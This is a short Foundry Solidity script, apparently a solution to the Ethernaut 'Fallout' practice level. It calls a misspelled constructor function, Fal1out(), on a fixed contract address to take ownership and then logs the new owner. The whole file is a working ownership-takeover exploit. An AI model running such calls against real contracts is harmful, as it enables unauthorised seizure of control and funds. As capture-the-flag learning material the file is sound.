// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

interface Fallout {
    function owner() external view returns (address);
    function Fal1out() external;
}

contract FalloutSol is Script {
    Fallout public fallout_ = Fallout(0x2F8685C7BE58637F7545D49A90dF05B5b4d2706b);

    function run() external {
        vm.startBroadcast();

        fallout_.Fal1out();
        console.log("Contract owner: ", fallout_.owner());

        vm.stopBroadcast();
    }
}